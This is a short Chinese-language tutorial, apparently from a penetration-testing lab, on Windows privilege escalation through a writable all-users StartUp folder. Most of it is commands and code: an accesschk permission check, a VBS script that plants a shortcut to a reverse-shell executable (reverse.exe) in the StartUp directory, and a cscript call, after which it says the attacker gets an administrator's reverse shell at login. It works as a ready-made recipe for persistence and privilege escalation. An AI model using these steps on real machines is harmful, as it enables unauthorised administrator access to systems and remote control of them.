# 开机启动的应用程序利用

原理：每个用户都可以通过将快捷方式放置在特定目录中来定义在登录时启动的应用程序。Windows 还为所有用户启动的应用程序提供了一个启动目录：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 如果可以**在此目录中创建文件**，我们可以使用反向 shell 可执行文件就可以提升权限。

```bash
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

将通过一个**vbs脚本来进行利用**。脚本内容如下：

```bash
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

**调用脚本,等待管理员登录即可获得反向shell：**

```bash
cscript C:\PrivEsc\CreateShortcut.vbs
```